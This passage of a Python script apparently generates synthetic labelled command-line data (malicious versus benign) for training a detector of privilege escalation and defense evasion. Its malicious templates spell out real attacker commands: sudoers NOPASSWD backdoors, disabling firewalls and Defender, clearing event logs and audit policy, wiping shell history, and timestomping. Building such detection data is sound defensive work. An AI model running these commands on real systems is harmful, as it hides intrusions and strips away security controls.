            ("sh", "sh -c 'echo \"{u} ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers.d/{hex}'"),
        ],
        "benign": [
            ("sudo", "sudo -u postgres /usr/bin/pg_ctl reload -D /var/lib/postgresql/data"),
            ("setcap", "setcap cap_net_bind_service=+ep /opt/app/bin/{fn}"),
            ("chown", "chown -R {u}:{u} /opt/app/releases/{ver} && chmod -R 750 /opt/app/releases/{ver}"),
            ("usermod", "usermod -aG docker,sudo {u}"),
            ("visudo", "visudo -c -f /etc/sudoers.d/deploy && systemctl restart sudo"),
            ("runas.exe", "runas.exe /user:CORP\\svc_deploy \"msiexec /i \\\\{h}\\sccm$\\{fn}-{ver}.msi /qn\""),
            ("powershell.exe", "powershell.exe Start-Process -FilePath 'C:\\Program Files\\Vendor\\update.exe' -Verb RunAs -ArgumentList '/silent /norestart'"),
            ("dpkg", "dpkg -i /opt/packages/{fn}-{ver}_amd64.deb && systemctl daemon-reload"),
            ("install", "install -o root -g root -m 4755 /opt/build/{fn} /usr/local/bin/{fn}"),
            ("icacls.exe", "icacls.exe \"C:\\Program Files\\Vendor\" /grant CORP\\Admins:(OI)(CI)F /T"),
            ("gpupdate.exe", "gpupdate.exe /force /target:computer"),
            ("sudo", "sudo /usr/sbin/setcap cap_sys_admin+ep /opt/monitoring/{fn}-agent"),
        ],
    },
    "defense_evasion": {
        "malicious": [
            ("netsh.exe", "netsh.exe advfirewall set {profile} state off"),
            ("netsh.exe", "netsh.exe advfirewall firewall set rule group=\"{fwgroup}\" new enable=No"),
            ("sc.exe", "sc.exe config {svc} start= disabled & sc.exe stop {svc}"),
            ("powershell.exe", "powershell.exe Set-MpPreference -{mpopt} $true"),
            ("wevtutil.exe", "wevtutil.exe cl \"{log}\""),
            ("auditpol.exe", "auditpol.exe /set /category:\"{auditcat}\" /success:disable /failure:disable"),
            ("bash", "bash -c 'history -c; rm -f ~/.bash_history; unset HISTFILE; rm -f {logpath}'"),
            ("fsutil.exe", "fsutil.exe usn deletejournal /d {drive}"),
            ("powershell.exe", "powershell.exe \"(Get-Item C:\\Temp\\{hex}.exe).LastWriteTime=(Get-Date '{date}')\""),
            ("iptables", "iptables -F; iptables -P INPUT ACCEPT; rm -f {logpath}"),
            ("reg.exe", "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\{svc} /v Start /t REG_DWORD /d 4 /f"),
            ("powershell.exe", "powershell.exe Remove-EventLog -LogName \"{log}\""),
        ],
        "benign": [
            ("netsh.exe", "netsh.exe advfirewall firewall add rule name=\"Allow App {ver}\" dir=in action=allow protocol=TCP localport={port}"),
            ("sc.exe", "sc.exe config {svc} start= auto (corporate baseline GPO {hex})"),
            ("powershell.exe", "powershell.exe Set-MpPreference -ExclusionPath 'C:\\Program Files\\Vendor\\{fn}' -ExclusionExtension '.tmp' (approved CR-{p})"),
            ("wevtutil.exe", "wevtutil.exe sl Security /ms:1073741824 /rt:false (log sizing per policy)"),
            ("auditpol.exe", "auditpol.exe /set /subcategory:\"Logon\" /success:enable /failure:enable"),
            ("gpupdate.exe", "gpupdate.exe /force && gpresult /h C:\\Logs\\gpresult-{h}.html"),
            ("netsh.exe", "netsh.exe advfirewall export C:\\Backups\\fw\\policy-{ver}.wfw"),
            ("firewall-cmd", "firewall-cmd --permanent --add-service=https --zone=public && firewall-cmd --reload"),
            ("ufw", "ufw allow from {int_ip}/24 to any port {port} proto tcp comment 'app cluster {ver}'"),
            ("powershell.exe", "powershell.exe Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Vendor' -Name LogLevel -Value 2 (CR-{p})"),
            ("auditctl", "auditctl -w /etc/passwd -p wa -k identity (CIS benchmark rollout)"),
            ("logrotate", "logrotate -f /etc/logrotate.d/{fn} --state /var/lib/logrotate/{fn}.status"),
        ],
    },
}


def build_category(attack_type, label, target):
    """Sample (process_name, command_line) rows until `target` is reached.

    Prefers unique rows. If the realistic template space is smaller than the
    target (e.g. fixed-form defense-evasion commands), tops up the remainder by
    sampling with replacement -- repeated identical commands are realistic for a
    training set (same tool run across many hosts) -- and reports the dup count.
    """
    templates = CATEGORIES[attack_type][label]
    seen = set()
    rows = []
    tries = 0
    max_tries = target * MAX_TRIES_FACTOR
    while len(rows) < target and tries < max_tries:
        tries += 1
        proc, tmpl = pick(templates)
        cmd = fill(tmpl)
        key = (proc, cmd)
        if key in seen:
            continue
        seen.add(key)
        rows.append((proc, cmd, label, attack_type))

    dups = 0
    while len(rows) < target:  # top-up with replacement if unique space exhausted
        proc, tmpl = pick(templates)
        rows.append((proc, fill(tmpl), label, attack_type))
        dups += 1
    if dups:
        print(f"  note: {attack_type}/{label} topped up {dups} repeated row(s) "
              f"(unique space ~{len(seen)}).")
    return rows


def main():
    all_rows = []
    summary = {}
    for attack_type in CATEGORIES:
        mal = build_category(attack_type, "malicious", MAL_PER_CAT)
        ben = build_category(attack_type, "benign", BEN_PER_CAT)
        all_rows.extend(mal)
        all_rows.extend(ben)
        summary[attack_type] = (len(mal), len(ben))

    random.shuffle(all_rows)

    os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
    with open(OUT_PATH, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["process_name", "command_line", "label", "attack_type"])
        w.writerows(all_rows)

    print(f"Wrote {len(all_rows)} rows -> {OUT_PATH}")
    print(f"{'attack_type':<20} {'malicious':>10} {'benign':>8}")
    for at, (m, b) in summary.items():
        print(f"{at:<20} {m:>10} {b:>8}")


if __name__ == "__main__":
    main()
